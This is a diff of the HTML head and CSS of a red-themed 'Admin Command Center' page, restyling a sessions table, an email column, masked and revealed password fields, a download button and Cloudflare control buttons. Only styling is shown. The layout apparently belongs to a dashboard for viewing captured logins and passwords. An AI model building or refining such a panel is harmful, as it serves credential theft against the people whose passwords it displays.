@@ -1,27 +1,11 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS COMMAND CENTER</title>
+    <title>ADMIN COMMAND CENTER</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Orbitron:wght@400;700;900&display=swap');
-
-        :root {
-            --primary-red: #ff0033;
-            --secondary-red: #cc0029;
-            --accent-red: #ff3355;
-            --dark-bg: #0a0a0a;
-            --darker-bg: #050505;
-            --grid-color: rgba(255, 0, 51, 0.1);
-            --success-green: #00ff88;
-            --warning-yellow: #ffaa00;
-            --info-blue: #0099ff;
-            --text-primary: #ffffff;
-            --text-secondary: #cccccc;
-            --border-glow: 0 0 20px rgba(255, 0, 51, 0.5);
-        }
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap');
 
         * {
             margin: 0;
@@ -31,114 +15,56 @@
 
         body {
             font-family: 'JetBrains Mono', monospace;
-            background: var(--dark-bg);
-            color: var(--text-primary);
+            background: linear-gradient(135deg, #1a0000 0%, #330000 50%, #1a0000 100%);
+            color: #ff3333;
             min-height: 100vh;
             overflow-x: auto;
-            position: relative;
         }
 
-        /* Advanced animated background */
-        .matrix-bg {
+        .terminal-bg {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: 
-                linear-gradient(90deg, transparent 98%, var(--grid-color) 100%),
-                linear-gradient(180deg, transparent 98%, var(--grid-color) 100%);
-            background-size: 50px 50px;
-            animation: gridMove 20s linear infinite;
-            z-index: -2;
-        }
-
-        .matrix-bg::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 25% 25%, rgba(255, 0, 51, 0.1) 0%, transparent 50%),
-                        radial-gradient(circle at 75% 75%, rgba(255, 51, 85, 0.1) 0%, transparent 50%);
-            animation: pulseGlow 8s ease-in-out infinite alternate;
-        }
-
-        @keyframes gridMove {
-            0% { transform: translate(0, 0); }
-            100% { transform: translate(50px, 50px); }
-        }
-
-        @keyframes pulseGlow {
-            0% { opacity: 0.3; }
-            100% { opacity: 0.8; }
-        }
-
-        /* Floating particles */
-        .particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+                radial-gradient(circle at 20% 80%, rgba(255, 0, 0, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 51, 51, 0.1) 0%, transparent 50%),
+                linear-gradient(45deg, transparent 49%, rgba(255, 0, 0, 0.02) 50%, transparent 51%);
             pointer-events: none;
             z-index: -1;
         }
 
-        .particle {
-            position: absolute;
-            width: 2px;
-            height: 2px;
-            background: var(--primary-red);
-            border-radius: 50%;
-            animation: float 15s infinite linear;
-            opacity: 0.6;
-        }
-
-        @keyframes float {
-            0% {
-                transform: translateY(100vh) translateX(0);
-                opacity: 0;
-            }
-            10% {
-                opacity: 0.6;
-            }
-            90% {
-                opacity: 0.6;
-            }
-            100% {
-                transform: translateY(-100px) translateX(100px);
-                opacity: 0;
-            }
-        }
-
-        /* Main container with advanced styling */
         .container {
-            max-width: 1600px;
+            max-width: 1400px;
             margin: 0 auto;
-            background: linear-gradient(135deg, rgba(10, 10, 10, 0.95) 0%, rgba(20, 0, 0, 0.95) 100%);
-            border: 2px solid var(--primary-red);
-            border-radius: 15px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid #ff3333;
+            border-radius: 0;
             box-shadow: 
-                var(--border-glow),
-                inset 0 0 50px rgba(255, 0, 51, 0.1);
+                0 0 20px rgba(255, 51, 51, 0.3),
+                inset 0 0 20px rgba(255, 0, 0, 0.1);
             overflow: hidden;
-            backdrop-filter: blur(20px);
-            position: relative;
-            margin-top: 20px;
-            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
         }
 
-        .container::before {
+        .header {
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 3px solid #ff3333;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
             content: '';
             position: absolute;
             top: 0;
             left: -100%;
             width: 100%;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, var(--accent-red), transparent);
-            animation: scanline 4s infinite;
+            height: 100%;
+            animation: scanline 3s infinite;
         }
 
         @keyframes scanline {
@@ -146,266 +72,127 @@
             100% { left: 100%; }
         }
 
-        /* Enhanced header */
-        .header {
-            background: linear-gradient(135deg, var(--darker-bg) 0%, #1a0000 100%);
-            padding: 30px;
-            text-align: center;
-            border-bottom: 3px solid var(--primary-red);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .header::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--primary-red), transparent);
-            animation: pulse 2s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 0.5; }
-            50% { opacity: 1; }
-        }
-
         .ascii-art {
             font-family: 'JetBrains Mono', monospace;
-            font-size: 10px;
+            font-size: 8px;
             line-height: 1;
-            color: var(--accent-red);
-            text-shadow: 0 0 10px var(--primary-red);
-            margin-bottom: 20px;
+            color: #ff6666;
+            text-shadow: 0 0 5px #ff3333;
+            margin-bottom: 15px;
             white-space: pre;
-            animation: textGlow 3s ease-in-out infinite alternate;
-        }
-
-        @keyframes textGlow {
-            0% { text-shadow: 0 0 10px var(--primary-red), 0 0 20px var(--primary-red); }
-            100% { text-shadow: 0 0 20px var(--primary-red), 0 0 30px var(--accent-red); }
         }
 
         .header h1 {
-            font-family: 'Orbitron', monospace;
-            font-size: 42px;
-            font-weight: 900;
+            font-size: 32px;
+            font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 5px;
-            background: linear-gradient(45deg, var(--primary-red), var(--accent-red), var(--primary-red));
-            background-size: 200% 200%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: gradientShift 3s ease-in-out infinite;
+            letter-spacing: 3px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
             position: relative;
+            z-index: 1;
         }
 
-        @keyframes gradientShift {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-
-        /* Status indicator */
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 30px;
-            background: linear-gradient(135deg, rgba(255, 0, 51, 0.1) 0%, rgba(0, 0, 0, 0.8) 100%);
-            border-bottom: 1px solid var(--primary-red);
-            font-size: 12px;
-        }
-
-        .status-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--success-green);
-            animation: pulse 2s infinite;
-            box-shadow: 0 0 10px currentColor;
-        }
-
-        /* Authentication section with advanced styling */
         .auth-section {
-            background: linear-gradient(135deg, rgba(255, 0, 51, 0.05) 0%, rgba(0, 0, 0, 0.9) 100%);
-            border: 1px solid var(--primary-red);
-            padding: 30px;
-            margin: 25px;
-            border-radius: 10px;
+            background: linear-gradient(135deg, #220000 0%, #330000 100%);
+            border: 1px solid #ff3333;
+            padding: 25px;
+            margin: 20px;
+            border-radius: 0;
             box-shadow: 
-                0 0 25px rgba(255, 51, 51, 0.3),
-                inset 0 0 25px rgba(255, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .auth-section::before {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(45deg, var(--primary-red), var(--accent-red), var(--primary-red));
-            border-radius: inherit;
-            z-index: -1;
-            animation: borderGlow 3s linear infinite;
-        }
-
-        @keyframes borderGlow {
-            0%, 100% { opacity: 0.5; }
-            50% { opacity: 1; }
+                0 0 15px rgba(255, 51, 51, 0.3),
+                inset 0 0 15px rgba(255, 0, 0, 0.1);
         }
 
         .auth-section.authenticated {
-            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1) 0%, rgba(0, 50, 0, 0.9) 100%);
-            border-color: var(--success-green);
+            background: linear-gradient(135deg, #002200 0%, #003300 100%);
+            border-color: #00ff00;
             box-shadow: 
-                0 0 25px rgba(0, 255, 136, 0.3),
-                inset 0 0 25px rgba(0, 255, 0, 0.1);
+                0 0 15px rgba(0, 255, 0, 0.3),
+                inset 0 0 15px rgba(0, 255, 0, 0.1);
         }
 
         .terminal-prompt {
-            color: var(--accent-red);
-            font-size: 16px;
-            margin-bottom: 15px;
-            font-weight: 700;
-            text-shadow: 0 0 5px var(--primary-red);
+            color: #ff6666;
+            font-size: 14px;
+            margin-bottom: 10px;
         }
 
         .terminal-prompt::before {
-            content: ">> NEXUS_AUTH_REQUIRED: ";
-            color: var(--primary-red);
+            content: "Admin Panel Login: ";
+            color: #ff3333;
             font-weight: bold;
-            animation: blink 1.5s infinite;
-        }
-
-        @keyframes blink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0.3; }
         }
 
         .token-input {
-            width: 250px;
-            padding: 12px 15px;
-            border: 2px solid var(--primary-red);
-            border-radius: 8px;
-            background: rgba(0, 0, 0, 0.9);
-            color: var(--accent-red);
+            width: 175px;
+            padding: 6px 8px;
+            border: 1px solid #ff3333;
+            border-radius: 0;
+            background: rgba(0, 0, 0, 0.8);
+            color: #ff6666;
             font-family: 'JetBrains Mono', monospace;
-            font-size: 14px;
-            margin-right: 15px;
+            font-size: 12px;
+            margin-right: 8px;
             outline: none;
-            box-shadow: 
-                inset 0 0 10px rgba(255, 51, 51, 0.2),
-                0 0 0 rgba(255, 51, 51, 0.5);
-            transition: all 0.3s ease;
-        }
-
-        .token-input:focus {
-            border-color: var(--accent-red);
-            box-shadow: 
-                inset 0 0 10px rgba(255, 51, 51, 0.4),
-                0 0 20px rgba(255, 51, 51, 0.8);
-            transform: scale(1.02);
+            box-shadow: inset 0 0 5px rgba(255, 51, 51, 0.2);
         }
 
         .auth-btn {
-            background: linear-gradient(135deg, var(--primary-red) 0%, var(--secondary-red) 100%);
-            color: var(--text-primary);
-            padding: 12px 25px;
+            background: linear-gradient(135deg, #ff3333 0%, #cc0000 100%);
+            color: #fff;
+            padding: 6px 12px;
             border: none;
-            border-radius: 8px;
+            border-radius: 0;
             cursor: pointer;
             font-family: 'JetBrains Mono', monospace;
-            font-weight: 700;
+            font-weight: 500;
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(255, 51, 51, 0.4);
-            position: relative;
-            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(255, 51, 51, 0.3);
         }
 
-        .auth-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: left 0.5s;
+        .logout-btn {
+            background: linear-gradient(135deg, #cc0000 0%, #990000 100%);
+            margin-left: 15px;
         }
 
-        .auth-btn:hover::before {
-            left: 100%;
-        }
-
-        .auth-btn:hover {
-            background: linear-gradient(135deg, var(--accent-red) 0%, var(--primary-red) 100%);
-            box-shadow: 0 6px 25px rgba(255, 51, 51, 0.6);
-            transform: translateY(-2px);
-        }
-
-        /* Advanced dashboard grid */
         .dashboard-section {
-            padding: 30px;
-            background: linear-gradient(135deg, rgba(255, 51, 51, 0.02) 0%, rgba(0, 0, 0, 0.5) 100%);
-            border-bottom: 2px solid var(--primary-red);
+            padding: 25px;
+            background: linear-gradient(135deg, rgba(255, 51, 51, 0.05) 0%, rgba(0, 0, 0, 0.3) 100%);
+            border-bottom: 2px solid #ff3333;
         }
 
         .dashboard-title {
-            font-family: 'Orbitron', monospace;
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 700;
-            color: var(--accent-red);
-            margin: 0 0 30px 0;
+            color: #ff6666;
+            margin: 0 0 25px 0;
             text-transform: uppercase;
-            letter-spacing: 3px;
-            text-shadow: 0 0 15px var(--primary-red);
-            position: relative;
-        }
-
-        .dashboard-title::after {
-            content: '';
-            position: absolute;
-            bottom: -10px;
-            left: 0;
-            width: 100px;
-            height: 2px;
-            background: linear-gradient(90deg, var(--primary-red), transparent);
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px #ff3333;
         }
 
         .dashboard-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 25px;
-            margin-bottom: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 15px;
         }
 
         .dashboard-card {
-            background: linear-gradient(135deg, rgba(0, 0, 0, 0.95) 0%, rgba(51, 0, 0, 0.8) 100%);
-            border: 2px solid var(--primary-red);
-            border-radius: 15px;
-            padding: 30px;
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9) 0%, rgba(51, 0, 0, 0.7) 100%);
+            border: 2px solid #ff3333;
+            border-radius: 0;
+            padding: 25px;
             box-shadow: 
-                0 0 20px rgba(255, 51, 51, 0.3),
-                inset 0 0 20px rgba(255, 0, 0, 0.1);
+                0 0 15px rgba(255, 51, 51, 0.3),
+                inset 0 0 15px rgba(255, 0, 0, 0.1);
             display: flex;
             align-items: center;
-            transition: all 0.4s ease;
+            transition: all 0.3s ease;
             position: relative;
             overflow: hidden;
-            backdrop-filter: blur(10px);
         }
 
         .dashboard-card::before {
@@ -414,9 +201,9 @@
             top: 0;
             left: -100%;
             width: 100%;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, var(--accent-red), transparent);
-            animation: cardScan 5s infinite;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #ff6666, transparent);
+            animation: cardScan 4s infinite;
         }
 
         @keyframes cardScan {
@@ -425,46 +212,40 @@
         }
 
         .dashboard-card:hover {
-            transform: translateY(-8px) scale(1.03);
+            transform: translateY(-3px) scale(1.02);
             box-shadow: 
-                0 15px 40px rgba(255, 51, 51, 0.6),
-                inset 0 0 30px rgba(255, 0, 0, 0.2);
-            border-color: var(--accent-red);
+                0 8px 25px rgba(255, 51, 51, 0.5),
+                inset 0 0 25px rgba(255, 0, 0, 0.2);
+            border-color: #ff6666;
         }
 
         .dashboard-card.success {
-            border-color: var(--success-green);
-            background: linear-gradient(135deg, rgba(0, 0, 0, 0.95) 0%, rgba(0, 51, 0, 0.8) 100%);
+            border-color: #00ff00;
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9) 0%, rgba(0, 51, 0, 0.7) 100%);
         }
 
         .dashboard-card.success::before {
-            background: linear-gradient(90deg, transparent, var(--success-green), transparent);
+            background: linear-gradient(90deg, transparent, #00ff66, transparent);
         }
 
         .dashboard-card.error {
             border-color: #ff0000;
-            background: linear-gradient(135deg, rgba(0, 0, 0, 0.95) 0%, rgba(51, 0, 0, 0.95) 100%);
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9) 0%, rgba(51, 0, 0, 0.9) 100%);
         }
 
         .dashboard-card.info {
-            border-color: var(--info-blue);
-            background: linear-gradient(135deg, rgba(0, 0, 0, 0.95) 0%, rgba(0, 0, 51, 0.8) 100%);
+            border-color: #0099ff;
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9) 0%, rgba(0, 0, 51, 0.7) 100%);
         }
 
         .dashboard-card.info::before {
-            background: linear-gradient(90deg, transparent, var(--info-blue), transparent);
+            background: linear-gradient(90deg, transparent, #0099ff, transparent);
         }
 
         .dashboard-card-icon {
-            font-size: 24px;
-            margin-right: 20px;
-            text-shadow: 0 0 10px currentColor;
-            animation: iconPulse 2s ease-in-out infinite;
-        }
-
-        @keyframes iconPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
+            font-size: 11px;
+            margin-right: 7px;
+            text-shadow: 0 0 3px currentColor;
         }
 
         .dashboard-card-content {
@@ -472,17 +253,16 @@
         }
 
         .dashboard-card-number {
-            font-size: 32px;
-            font-weight: 900;
-            color: var(--accent-red);
+            font-size: 12px;
+            font-weight: 700;
+            color: #ff6666;
             line-height: 1;
-            margin-bottom: 8px;
-            text-shadow: 0 0 10px currentColor;
-            font-family: 'Orbitron', monospace;
+            margin-bottom: 3px;
+            text-shadow: 0 0 5px currentColor;
         }
 
         .dashboard-card.success .dashboard-card-number {
-            color: var(--success-green);
+            color: #00ff66;
         }
 
         .dashboard-card.error .dashboard-card-number {
@@ -490,188 +270,277 @@
         }
 
         .dashboard-card.info .dashboard-card-number {
-            color: var(--info-blue);
+            color: #0099ff;
         }
 
         .dashboard-card-label {
-            font-size: 12px;
+            font-size: 5px;
             color: #999;
             font-weight: 500;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.3px;
         }
 
-        /* Advanced control panels */
-        .control-panel {
-            background: linear-gradient(135deg, rgba(0, 153, 255, 0.1) 0%, rgba(0, 0, 0, 0.9) 100%);
-            border: 2px solid var(--info-blue);
-            border-radius: 12px;
-            padding: 25px;
-            box-shadow: 
-                0 0 15px rgba(0, 153, 255, 0.3),
-                inset 0 0 15px rgba(0, 153, 255, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .control-panel::before {
-            content: '';
-            position: absolute;
-            top: -1px;
-            left: -1px;
-            right: -1px;
-            bottom: -1px;
-            background: linear-gradient(45deg, var(--info-blue), #0066cc, var(--info-blue));
-            border-radius: inherit;
-            z-index: -1;
-            animation: borderPulse 4s ease-in-out infinite;
-        }
-
-        @keyframes borderPulse {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 0.8; }
-        }
-
-        .control-panel.danger {
-            border-color: var(--primary-red);
-            background: linear-gradient(135deg, rgba(255, 51, 51, 0.1) 0%, rgba(0, 0, 0, 0.9) 100%);
-        }
-
-        .control-panel.success {
-            border-color: var(--success-green);
-            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1) 0%, rgba(0, 0, 0, 0.9) 100%);
-        }
-
-        .control-btn {
-            background: linear-gradient(135deg, var(--info-blue) 0%, #0066cc 100%);
-            color: var(--text-primary);
-            padding: 12px 20px;
-            border: 2px solid var(--info-blue);
-            border-radius: 8px;
-            cursor: pointer;
-            font-family: 'JetBrains Mono', monospace;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: all 0.3s ease;
-            width: 100%;
-            margin-bottom: 10px;
-            font-size: 12px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .control-btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 50%;
-            transition: all 0.3s ease;
-            transform: translate(-50%, -50%);
-        }
-
-        .control-btn:hover::before {
-            width: 300px;
-            height: 300px;
-        }
-
-        .control-btn:hover {
-            background: linear-gradient(135deg, #00ccff 0%, var(--info-blue) 100%);
-            box-shadow: 0 0 20px rgba(0, 153, 255, 0.6);
-            transform: translateY(-2px);
-        }
-
-        .control-btn.danger {
-            background: linear-gradient(135deg, var(--primary-red) 0%, var(--secondary-red) 100%);
-            border-color: var(--primary-red);
-        }
-
-        .control-btn.danger:hover {
-            background: linear-gradient(135deg, var(--accent-red) 0%, var(--primary-red) 100%);
-            box-shadow: 0 0 20px rgba(255, 51, 51, 0.6);
-        }
-
-        .control-btn.success {
-            background: linear-gradient(135deg, var(--success-green) 0%, #00aa66 100%);
-            border-color: var(--success-green);
-        }
-
-        .control-btn.success:hover {
-            background: linear-gradient(135deg, #00ffaa 0%, var(--success-green) 100%);
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.6);
-        }
-
-        /* Enhanced sessions table */
         .sessions-header {
-            padding: 20px 20px 0 20px;
-            background: linear-gradient(135deg, rgba(255, 51, 51, 0.05) 0%, rgba(0, 0, 0, 0.5) 100%);
+            padding: 8px 8px 0 8px;
+            background: linear-gradient(135deg, rgba(255, 51, 51, 0.05) 0%, rgba(0, 0, 0, 0.3) 100%);
         }
 
         .sessions-header h2 {
-            font-family: 'Orbitron', monospace;
-            font-size: 24px;
+            font-size: 8px;
             font-weight: 700;
-            color: var(--accent-red);
+            color: #ff6666;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 10px var(--primary-red);
+            letter-spacing: 1px;
+            text-shadow: 0 0 3px #ff3333;
         }
 
         .sessions-table {
             width: 100%;
             border-collapse: collapse;
-            background: rgba(0, 0, 0, 0.9);
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 0 30px rgba(255, 51, 51, 0.3);
+            background: rgba(0, 0, 0, 0.8);
         }
 
         .sessions-table th {
             background: linear-gradient(135deg, #330000 0%, #220000 100%);
-            padding: 15px;
+            padding: 7px;
             text-align: left;
             font-weight: 700;
-            color: var(--accent-red);
-            border: 1px solid var(--primary-red);
+            color: #ff6666;
+            border: 1px solid #ff3333;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            font-size: 12px;
-            position: relative;
-        }
-
-        .sessions-table th::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--primary-red), transparent);
+            letter-spacing: 0.3px;
+            font-size: 5px;
         }
 
         .sessions-table td {
-            padding: 15px;
-            border: 1px solid var(--primary-red);
+            padding: 7px;
+            border: 1px solid #ff3333;
             vertical-align: middle;
-            background: rgba(0, 0, 0, 0.8);
-            font-size: 12px;
-            transition: all 0.3s ease;
+            background: rgba(0, 0, 0, 0.6);
+            font-size: 7px;
         }
 
         .sessions-table tr:hover td {
-            background: rgba(255, 51, 51, 0.15);
-            box-shadow: inset 0 0 15px rgba(255, 51, 51, 0.3);
-            transform: scale(1.01);
+            background: rgba(255, 51, 51, 0.1);
+            box-shadow: inset 0 0 10px rgba(255, 51, 51, 0.2);
         }
 
-        /* Responsive design */
+        .email-cell {
+            font-weight: 500;
+            color: #ff6666;
+            text-shadow: 0 0 5px #ff3333;
+        }
+
+        .password-container {
+            position: relative;
+            display: inline-block;
+            width: 100%;
+        }
+
+        .password-masked,
+        .password-revealed {
+            font-family: 'JetBrains Mono', monospace;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 7px;
+            border: 1px solid #ff3333;
+            border-radius: 0;
+            font-size: 8px;
+            color: #ff6666;
+        }
+
+        .password-revealed {
+            background: rgba(255, 51, 51, 0.1);
+            border-color: #ff6666;
+            word-break: break-all;
+        }
+
+        .reveal-btn {
+            background: linear-gradient(135deg, #666 0%, #333 100%);
+            color: #fff;
+            padding: 4px 8px;
+            border: 1px solid #ff3333;
+            border-radius: 0;
+            cursor: pointer;
+            font-size: 7px;
+            margin-left: 7px;
+            font-family: 'JetBrains Mono', monospace;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+
+        .reveal-btn:hover {
+            background: linear-gradient(135deg, #ff3333 0%, #cc0000 100%);
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, #00aa00 0%, #006600 100%);
+            color: #fff;
+            padding: 7px 12px;
+            border: 1px solid #00ff00;
+            border-radius: 0;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 9px;
+            font-family: 'JetBrains Mono', monospace;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+        }
+
+        .download-btn:hover {
+            background: linear-gradient(135deg, #00ff00 0%, #00aa00 100%);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+        }
+
+        .session-info {
+            font-size: 8px;
+            color: #999;
+            margin-top: 5px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .auth-status {
+            margin-bottom: 20px;
+            font-weight: 500;
+            font-size: 16px;
+            color: #ff6666;
+        }
+
+        .loading,
+        .error,
+        .no-sessions {
+            text-align: center;
+            padding: 34px;
+            color: #ff6666;
+            font-size: 12px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .error {
+            color: #ff3333;
+            text-shadow: 0 0 10px #ff3333;
+        }
+
+        .glitch {
+            animation: glitch 2s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 90%, 100% { transform: translate(0); }
+            10% { transform: translate(-1px, -1px); }
+            20% { transform: translate(1px, 1px); }
+            30% { transform: translate(-1px, 1px); }
+            40% { transform: translate(1px, -1px); }
+            50% { transform: translate(-1px, -1px); }
+            60% { transform: translate(1px, 1px); }
+            70% { transform: translate(-1px, 1px); }
+            80% { transform: translate(1px, -1px); }
+        }
+
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar {
+            width: 12px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #000;
+            border: 1px solid #ff3333;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, #ff3333 0%, #cc0000 100%);
+            border-radius: 0;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(135deg, #ff6666 0%, #ff3333 100%);
+        }
+
+        .cloudflare-control-panel {
+            background: linear-gradient(135deg, rgba(0, 153, 255, 0.1) 0%, rgba(0, 0, 0, 0.8) 100%);
+            border: 1px solid #0099ff;
+            border-radius: 0;
+            padding: 17px;
+            box-shadow: 
+                0 0 10px rgba(0, 153, 255, 0.3),
+                inset 0 0 10px rgba(0, 153, 255, 0.1);
+        }
+
+        .cf-control-btn {
+            background: linear-gradient(135deg, #0099ff 0%, #0066cc 100%);
+            color: #fff;
+            padding: 8px 14px;
+            border: 1px solid #0099ff;
+            border-radius: 0;
+            cursor: pointer;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-bottom: 7px;
+            font-size: 8px;
+        }
+
+        .cf-control-btn:hover {
+            background: linear-gradient(135deg, #00ccff 0%, #0099ff 100%);
+            box-shadow: 0 0 15px rgba(0, 153, 255, 0.5);
+            transform: translateY(-1px);
+        }
+
+        .cf-control-btn.cf-emergency {
+            background: linear-gradient(135deg, #ff3333 0%, #cc0000 100%);
+            border-color: #ff3333;
+        }
+
+        .cf-control-btn.cf-emergency:hover {
+            background: linear-gradient(135deg, #ff6666 0%, #ff3333 100%);
+            box-shadow: 0 0 15px rgba(255, 51, 51, 0.5);
+        }
+
+        .cf-control-btn.cf-disable {
+            background: linear-gradient(135deg, #666 0%, #333 100%);
+            border-color: #666;
+        }
+
+        .cf-control-btn.cf-disable:hover {
+            background: linear-gradient(135deg, #999 0%, #666 100%);
+            box-shadow: 0 0 15px rgba(153, 153, 153, 0.5);
+        }
+
+        .cf-select {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #0099ff;
+            border-radius: 0;
+            background: rgba(0, 0, 0, 0.8);
+            color: #0099ff;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            margin-bottom: 7px;
+            outline: none;
+        }
+
+        .cf-select:focus {
+            box-shadow: 0 0 10px rgba(0, 153, 255, 0.5);
+        }
+
+        .control-description {
+            font-size: 11px;
+            color: #999;
+            font-style: italic;
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+
         @media (max-width: 768px) {
             .header h1 {
-                font-size: 28px;
+                font-size: 24px;
             }
 
             .ascii-art {
@@ -687,186 +556,46 @@
             .dashboard-grid {
                 grid-template-columns: 1fr;
             }
-
-            .control-panel {
-                margin-bottom: 20px;
-            }
-        }
-
-        /* Loading animations */
-        .loading {
-            display: none;
-        }
-
-        .loading.show {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 40px;
-        }
-
-        .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(255, 51, 51, 0.3);
-            border-top: 3px solid var(--primary-red);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Additional enhancements */
-        .section-divider {
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--primary-red), transparent);
-            margin: 30px 0;
-            position: relative;
-        }
-
-        .section-divider::before {
-            content: '';
-            position: absolute;
-            top: -1px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 10px;
-            height: 4px;
-            background: var(--primary-red);
-            box-shadow: 0 0 10px var(--primary-red);
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        .password-section {
-            display: none;
-        }
-
-        .password-section.visible {
-            display: block;
-        }
-
-        .message {
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            border: 1px solid;
-        }
-
-        .message.success {
-            background: rgba(0, 255, 136, 0.1);
-            color: var(--success-green);
-            border-color: var(--success-green);
-        }
-
-        .message.error {
-            background: rgba(255, 51, 51, 0.1);
-            color: var(--primary-red);
-            border-color: var(--primary-red);
-        }
-
-        .message.info {
-            background: rgba(0, 153, 255, 0.1);
-            color: var(--info-blue);
-            border-color: var(--info-blue);
-        }
-
-        /* Floating input styles */
-        .cf-select, .cf-input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 2px solid var(--info-blue);
-            border-radius: 8px;
-            background: rgba(0, 0, 0, 0.9);
-            color: var(--info-blue);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 12px;
-            margin-bottom: 15px;
-            outline: none;
-            transition: all 0.3s ease;
-        }
-
-        .cf-select:focus, .cf-input:focus {
-            border-color: #00ccff;
-            box-shadow: 0 0 15px rgba(0, 153, 255, 0.5);
-            transform: scale(1.02);
-        }
-
-        .control-description {
-            font-size: 11px;
-            color: #999;
-            font-style: italic;
-            margin-top: 10px;
-            line-height: 1.4;
-            padding: 10px;
